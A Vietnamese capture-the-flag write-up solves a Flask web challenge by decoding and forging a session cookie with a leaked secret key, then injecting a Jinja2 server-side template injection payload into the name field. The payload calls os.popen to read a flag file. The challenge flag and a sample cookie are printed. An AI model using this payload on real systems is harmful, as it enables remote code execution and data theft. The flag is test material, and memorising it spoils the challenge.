![image](https://github.com/caodchuong312/CTFs/assets/92881216/fab24edf-eaf9-4440-9867-68111433692a)

Xuất hiện form login:

![image](https://github.com/caodchuong312/CTFs/assets/92881216/ee4d7ac8-e221-45b1-806a-dc0bdecdf3e0)

Nhìn vào source ta thấy có endpoint web được tạo với `Flask` và sử dụng session để quản lý user.

Trong file `main.py`, sau khi kiểm tra login thành công `session` sẽ được thêm giá trị `name` và được render qua template:

![image](https://github.com/caodchuong312/CTFs/assets/92881216/166cfdf7-a746-4d2f-a56f-0123b3f6eca1)

`session["name"]` là giá trị ta kiểm soát được, mặt khác theo description, `flag` nằm ở `/home/ctf/flag.txt` => lỗ hổng **SSTI** để thực thi shell.

Bên cạnh đó enpoint `\signup` dùng để đăng ký user bị disable, ta chỉ cẩn uncomment và tạo user dễ dàng có được session:

```
.eJwljjEOwjAMAP-SmSGxUzvuZyo3tikDRWrphPg7kdjudMt90hKHn1ua38flt7Q8LM2JER0xK3sXN3KtUBElFwlGqhw1ALCIqciowY1aAYauQLqqOVNnFUVRMc5MUo2iBWWQnmtt4KXxOpm0Sth0IgwuUwayVbpQGiPX6cf_pgzd9ekD-3a99nv6_gBuvzMM.ZOoMQA.9TuK6d-tv69zTbLY0Q2gt78DiB4
```
Dễ dàng decode nó vì biết được `secret key` trong file `__init__.py` là `SuperDuperSecureSecretKey1234!` (dùng `flask-unsgin` hoặc tool <a href="https://github.com/noraj/flask-session-cookie-manager">này</a>:

![image](https://github.com/caodchuong312/CTFs/assets/92881216/220f4abd-101a-4f01-a1ec-531dba20c46c)

Giờ ta sẽ test thử **SSTI** bằng payload `{{7*7}}` vào `name`: 

![image](https://github.com/caodchuong312/CTFs/assets/92881216/64cd45ef-8435-4551-9814-758ca270bfec)

Lấy `session` để login:

![image](https://github.com/caodchuong312/CTFs/assets/92881216/32653398-af12-44df-b0fa-bd84bf0796ba)

Như vậy là thành công, giờ dùng shell đọc `flag` là `{{self.__init__.__globals__.__builtins__.__import__('os').popen('cat /home/ctf/flag.txt').read()}}`:

![image](https://github.com/caodchuong312/CTFs/assets/92881216/a31523f2-4db6-41b2-a4df-23f849eb62a7)

Kết quả: 

![image](https://github.com/caodchuong312/CTFs/assets/92881216/a3c1b1c5-469b-41a7-b6f7-1f6052ac0207)

>flag: `FLAG{WH4TS_1N_A_N4M3_4ND_WH4TS_IN_Y0UR_FL4SK}`










